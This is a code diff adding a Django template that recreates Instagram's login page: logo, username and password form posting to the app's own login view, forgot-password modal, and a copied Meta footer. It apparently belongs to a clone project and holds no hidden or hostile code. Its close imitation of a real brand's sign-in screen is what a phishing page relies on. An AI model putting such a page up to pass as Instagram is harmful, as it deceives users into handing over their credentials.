@@ -1,0 +1,523 @@
+{% load static %}
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #0E1116;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1100px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            gap: 40px;
+            padding: 20px 0;
+        }
+
+        /* ============================================ */
+        /* LEFT SIDE - ONBOARDING ILLUSTRATION          */
+        /* ============================================ */
+        .left-side {
+            flex: 1.2;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            padding: 20px 0;
+            min-height: 500px;
+        }
+
+        /* Top Left Logo */
+        .top-logo {
+            position: absolute;
+            top: 0;
+            left: 0;
+            font-family: 'Grand Hotel', cursive;
+            font-size: 28px;
+            color: #f5f5f5;
+            background: linear-gradient(135deg, #FEDA75, #FA7E1E, #D62976, #962FBF, #4F5BD5);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            z-index: 20;
+        }
+
+        /* Heading */
+        .heading-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .heading-container .heading {
+            font-size: 28px;
+            font-weight: 700;
+            line-height: 1.3;
+            color: #ffffff;
+        }
+        .heading-container .heading .gradient {
+            background: linear-gradient(135deg, #FEDA75, #FA7E1E, #D62976, #962FBF, #4F5BD5);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        /* Left Image - Under the heading */
+        .left-image-container {
+            width: 100%;
+            max-width: 500px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 10px;
+        }
+        .left-image-container img {
+            width: 100%;
+            height: auto;
+            max-height: 400px;
+            object-fit: contain;
+            border-radius: 12px;
+        }
+
+        /* ============================================ */
+        /* RIGHT SIDE - LOGIN FORM (UNCHANGED)          */
+        /* ============================================ */
+        .right-side {
+            flex: 1;
+            max-width: 380px;
+        }
+
+        .login-box {
+            background: #121212;
+            border: 1px solid #2a2a2a;
+            border-radius: 4px;
+            padding: 40px 35px 30px;
+            margin-bottom: 12px;
+        }
+        .login-box .logo {
+            font-family: 'Grand Hotel', cursive;
+            font-size: 48px;
+            text-align: center;
+            color: #f5f5f5;
+            margin-bottom: 30px;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 12px 14px;
+            margin: 5px 0;
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #f5f5f5;
+            outline: none;
+            transition: 0.2s;
+        }
+        .login-box input::placeholder {
+            color: #8e8e8e;
+        }
+        .login-box input:focus {
+            border-color: #0095f6;
+        }
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.2s;
+        }
+        .login-box button:hover { 
+            background: #0077c2; 
+        }
+        .login-box .forgot {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        .login-box .forgot a { 
+            color: #0095f6; 
+            text-decoration: none; 
+        }
+        .login-box .forgot a:hover { text-decoration: underline; }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .divider hr {
+            flex: 1;
+            border: 0;
+            border-top: 1px solid #2a2a2a;
+        }
+        .divider span {
+            margin: 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .fb-login {
+            text-align: center;
+            margin: 10px 0;
+        }
+        .fb-login a {
+            color: #385185;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        .fb-login a:hover {
+            text-decoration: underline;
+        }
+
+        .signup-box {
+            background: #121212;
+            border: 1px solid #2a2a2a;
+            border-radius: 4px;
+            padding: 20px 35px;
+            text-align: center;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .signup-box a:hover {
+            text-decoration: underline;
+        }
+
+        .error { 
+            color: #ed4956; 
+            font-size: 14px; 
+            margin-bottom: 10px; 
+            text-align: center;
+        }
+        .success { 
+            color: #00a86b; 
+            font-size: 14px; 
+            margin-bottom: 10px; 
+            text-align: center;
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .footer .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px 16px;
+            margin-bottom: 12px;
+        }
+        .footer .footer-links a {
+            color: #555;
+            text-decoration: none;
+            font-size: 12px;
+            transition: 0.2s;
+        }
+        .footer .footer-links a:hover {
+            color: #8e8e8e;
+        }
+        .footer .footer-copy {
+            color: #555;
+            font-size: 12px;
+        }
+        .footer .footer-lang {
+            color: #8e8e8e;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: default;
+            margin-bottom: 8px;
+        }
+
+        /* Responsive */
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                gap: 30px;
+            }
+            .left-side {
+                display: none;
+            }
+            .right-side {
+                max-width: 100%;
+                width: 100%;
+            }
+            .login-box {
+                padding: 30px 20px;
+            }
+        }
+
+        /* Forgot Password Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 99999;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        .modal-content {
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            width: 380px;
+            max-width: 90%;
+            padding: 30px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.8);
+        }
+        .modal-content h2 {
+            color: #f5f5f5;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .modal-content p {
+            color: #8e8e8e;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+        .modal-content input {
+            width: 100%;
+            padding: 12px 14px;
+            margin: 5px 0;
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #f5f5f5;
+            outline: none;
+        }
+        .modal-content input::placeholder {
+            color: #8e8e8e;
+        }
+        .modal-content input:focus {
+            border-color: #0095f6;
+        }
+        .modal-content button {
+            width: 100%;
+            padding: 10px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.2s;
+        }
+        .modal-content button:hover { background: #0077c2; }
+        .modal-content .close-btn {
+            float: right;
+            color: #8e8e8e;
+            font-size: 24px;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+        .modal-content .close-btn:hover { color: #f5f5f5; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        
+        <!-- ============================================ -->
+        <!-- LEFT SIDE - ONBOARDING ILLUSTRATION          -->
+        <!-- ============================================ -->
+        <div class="left-side">
+            
+            <!-- Top Left Logo -->
+            <div class="top-logo">Instagram</div>
+
+            <!-- Heading -->
+            <div class="heading-container">
+                <div class="heading">
+                    See everyday moments from your<br>
+                    <span class="gradient">close friends</span>.
+                </div>
+            </div>
+
+            <!-- Image Under Heading -->
+            <div class="left-image-container">
+                <img src="{% static 'images/onboarding.png' %}" alt="Instagram Onboarding">
+            </div>
+
+        </div>
+
+        <!-- ============================================ -->
+        <!-- RIGHT SIDE - LOGIN FORM (UNCHANGED)          -->
+        <!-- ============================================ -->
+        <div class="right-side">
+            <div class="login-box">
+                <div class="logo">Instagram</div>
+                
+                {% if error %}
+                    <p class="error">{{ error }}</p>
+                {% endif %}
+                {% if success %}
+                    <p class="success">{{ success }}</p>
+                {% endif %}
+                
+                <form method="post" action="{% url 'login' %}">
+                    {% csrf_token %}
+                    <input type="text" name="username" placeholder="Mobile number, username or email" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <button type="submit">Log in</button>
+                </form>
+
+                <div class="forgot">
+                    <a href="#" onclick="openForgotModal()">Forgot password?</a>
+                </div>
+
+                <div class="divider">
+                    <hr><span>OR</span><hr>
+                </div>
+
+                <div class="fb-login">
+                    <a href="#" onclick="showToast('Facebook login coming soon!')">Log in with Facebook</a>
+                </div>
+            </div>
+
+            <div class="signup-box">
+                Don't have an account? <a href="{% url 'register' %}">Create new account</a>
+            </div>
+
+            <!-- Footer -->
+            <div class="footer">
+                <div class="footer-lang">English (India) ▼</div>
+                <div class="footer-links">
+                    <a href="#">Meta</a>
+                    <a href="#">About</a>
+                    <a href="#">Blog</a>
+                    <a href="#">Jobs</a>
+                    <a href="#">Help</a>
+                    <a href="#">API</a>
+                    <a href="#">Privacy</a>
+                    <a href="#">Terms</a>
+                    <a href="#">Locations</a>
+                    <a href="#">Popular</a>
+                    <a href="#">Instagram Lite</a>
+                    <a href="#">Meta AI</a>
+                    <a href="#">Threads</a>
+                    <a href="#">Contact Uploading & Non-Users</a>
+                    <a href="#">Meta Verified</a>
+                </div>
+                <div class="footer-copy">© 2026 Instagram from Meta</div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Forgot Password Modal -->
+    <div class="modal-overlay" id="forgotModal">
+        <div class="modal-content">
+            <button class="close-btn" onclick="closeForgotModal()">✕</button>
+            <h2>Forgotten your password?</h2>
+            <p>Enter your username, email address, or phone number to reset your password.</p>
+            <form method="post" action="{% url 'forgot_password' %}">
+                {% csrf_token %}
+                <input type="text" name="email" placeholder="Username, email, or phone number" required>
+                <button type="submit">Reset password</button>
+            </form>
+            <div id="forgotMessage"></div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================ //
+        // FORGOT PASSWORD MODAL                        //
+        // ============================================ //
+        function openForgotModal() {
+            document.getElementById('forgotModal').classList.add('active');
+        }
+        function closeForgotModal() {
+            document.getElementById('forgotModal').classList.remove('active');
+        }
+        document.getElementById('forgotModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeForgotModal();
+            }
+        });
+
+        // ============================================ //
+        // TOAST NOTIFICATION                           //
+        // ============================================ //
+        function showToast(message) {
+            const existing = document.getElementById('toast');
+            if (existing) existing.remove();
+            
+            const toast = document.createElement('div');
+            toast.id = 'toast';
+            toast.textContent = message;
+            toast.style.cssText = `
+                position: fixed;
+                bottom: 40px;
+                left: 50%;
+                transform: translateX(-50%);
+                background: #1a1a1a;
+                color: #f5f5f5;
+                padding: 12px 24px;
+                border-radius: 8px;
+                border: 1px solid #2a2a2a;
+                font-size: 14px;
+                z-index: 99999;
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.6);
+                animation: fadeInUp 0.3s ease;
+                max-width: 90%;
+                text-align: center;
+            `;
+            document.body.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transition = 'opacity 0.3s';
+                setTimeout(() => toast.remove(), 300);
+            }, 2500);
+        }
+
+        // ============================================ //
+        // CSS ANIMATIONS                              //
+        // ============================================ //
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes fadeInUp {
+                from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+                to { opacity: 1; transform: translateX(-50%) translateY(0); }
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+
+</body>
+</html>
